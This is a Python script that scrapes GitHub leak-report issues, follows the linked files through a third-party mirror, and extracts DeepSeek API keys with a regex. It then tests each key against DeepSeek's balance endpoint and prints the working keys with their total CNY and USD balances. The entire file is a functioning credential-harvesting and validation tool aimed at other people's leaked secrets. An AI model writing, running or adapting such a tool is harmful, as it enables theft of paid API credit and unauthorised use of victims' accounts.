import re
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

API_TOKEN = ""

DEEPSEEK_BALANCE_URL = "https://api.deepseek.com/user/balance"
GITHUB_SEARCH_URL = "https://api.github.com/search/issues?q=your key leak author:chinese-leak-key-check&sort=created&order=desc"

HEADERS = {'Accept': 'application/json'}
if API_TOKEN:
    HEADERS['Authorization'] = f"Bearer {API_TOKEN}"


def fetch_keys_from_issue(issue_item):
    keys = set()
    try:
        issue_url = issue_item.get("url")
        if not issue_url:
            return keys

        issue_body = requests.get(issue_url, headers=HEADERS, timeout=10).json().get("body", "")

        url_match = re.search(r"https?://github\.com\S+", issue_body)
        if not url_match:
            return keys

        raw_file_url = url_match.group().replace("github.com", "raw.keccak.top").replace("/blob", "")

        file_content = requests.get(raw_file_url, timeout=10).text
        found_keys = re.findall(r'\bsk-[a-zA-Z0-9]{32,}\b', file_content)

        return set(found_keys)
    except requests.RequestException:
        return keys


def check_key_balance(api_key):
    try:
        headers = {
            'Accept': 'application/json',
            'Authorization': f"Bearer {api_key}"
        }
        response = requests.get(DEEPSEEK_BALANCE_URL, headers=headers, timeout=10).json()

        if not response.get("is_available"):
            return api_key, None

        return api_key, response.get("balance_infos", [])
    except Exception:
        return api_key, None


def main():
    print("[*] Searching GitHub leaked issues...")
    try:
        search_results = requests.get(GITHUB_SEARCH_URL, headers=HEADERS, timeout=15).json().get("items", [])
    except requests.RequestException as e:
        print(f"[-] GitHub search request failed: {e}")
        return

    all_extracted_keys = set()
    print(f"[*] Found {len(search_results)} potential issues, extracting keys in parallel...")

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(fetch_keys_from_issue, item): item for item in search_results}
        for future in as_completed(futures):
            all_extracted_keys.update(future.result())

    print(f"[+] Extracted and deduplicated, got {len(all_extracted_keys)} unique keys.")

    cny_total = 0.0
    usd_total = 0.0
    valid_keys = []

    print("[*] Verifying key balances in parallel...")
    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = {executor.submit(check_key_balance, key): key for key in all_extracted_keys}
        for future in as_completed(futures):
            key, balance_infos = future.result()
            if balance_infos:
                valid_keys.append(key)
                print(f"\n[+] Valid key found: {key}")
                for info in balance_infos:
                    amount = float(info.get("total_balance", 0))
                    currency = info.get("currency", "CNY")
                    print(f"    -> Balance: {amount} {currency}")

                    if currency == "CNY":
                        cny_total += amount
                    else:
                        usd_total += amount

    print("\n" + "=" * 30)
    print("Summary:")
    print(f"CNY Total: {round(cny_total, 2)}")
    print(f"USD Total: {round(usd_total, 2)}")
    print(f"Valid keys ({len(valid_keys)}):")
    for k in valid_keys:
        print(k)
    print("=" * 30)


if __name__ == "__main__":
    main()